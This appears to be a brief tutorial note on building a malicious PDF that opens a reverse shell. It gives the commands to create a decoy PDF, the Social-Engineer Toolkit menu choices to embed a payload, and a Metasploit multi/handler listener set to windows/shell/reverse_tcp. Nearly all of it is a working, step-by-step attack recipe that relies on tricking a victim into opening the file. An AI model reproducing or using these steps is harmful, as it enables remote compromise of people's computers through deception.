# Reverse shell tcp exploit masked as adobe pdf


Create pdf 

`echo "Ur hacked lol" > hacked.txt`

install enscript `sudo apt install enscript`

Now turn txt into pdf
`enscript hacked.txt -o - | ps2pdf - hacked.pdf`

Start social engineering toolkit

`sudo setoolkit`

1, 1, 2, 13, 1

Select our pdf `/media/sf_Shared_Folder/hacked.pdf`

Set up according to your wishes

`sudo -i`

`cd root/.set/`

You can change where the pdf is set but for now we will just move it `mv hacked.pdf /home/kali`

Set up listener 

`msfconsole`

`use exploit/multi/handler`

`set payload windows/shell/reverse_tcp`



References:

https://www.youtube.com/watch?v=Zj_7Wunnu2w